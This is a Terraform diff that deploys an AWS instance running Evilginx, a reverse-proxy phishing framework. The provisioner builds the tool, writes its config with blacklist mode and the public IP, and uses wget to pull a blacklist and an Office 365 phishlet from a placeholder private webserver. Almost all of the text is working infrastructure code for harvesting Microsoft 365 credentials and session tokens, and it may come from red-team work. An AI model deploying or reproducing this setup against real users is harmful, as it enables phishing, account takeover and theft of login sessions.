@@ -1,4 +1,4 @@
-resource "aws_instance" "gen" {
+resource "aws_instance" "evilginx" {
   ami = var.ami
   # count                  = 3
   instance_type          = var.instance_type
@@ -15,14 +15,13 @@ resource "aws_instance" "gen" {
   connection {
     type        = "ssh"
     user        = "admin"
-    private_key = file("./keys/<public-key>")
+    private_key = file("./keys/<private-key>")
     host        = self.private_ip
   }
 
   provisioner "remote-exec" {
     inline = [
       "sleep 30",
-      "sudo apt update",
       ## install evilginx
       "cd /opt",
       "sudo apt install golang git make -y",
@@ -31,8 +30,12 @@ resource "aws_instance" "gen" {
       "sudo make",
       "sudo make install",
       ## modify evilginx
-      "sudo wget 'http://<webserver>/evilginx-blacklist.txt' -O '/root/.evilginx/blacklist.txt'",
-      "sudo wget 'http://<webserver>/o365-managed.yaml' -O '/usr/share/evilginx/phishlets/o365-managed.yaml'"
+      "sudo mkdir /root/.evilginx/",
+      "sudo echo \"blacklist_mode: unauth\" >> /tmp/config.yaml",
+      "sudo echo \"ip: ${aws_instance.evilginx.public_ip}\" >> /tmp/config.yaml",
+      "sudo mv /tmp/config.yaml /root/.evilginx/config.yaml",
+      "sudo wget 'http://<private-webserver>/ip-blacklist.txt' -O '/root/.evilginx/blacklist.txt'",
+      "sudo wget 'http://<private-webserver>/o365-managed.yaml' -O '/usr/share/evilginx/phishlets/o365-managed.yaml'"
       ]
   }
 }
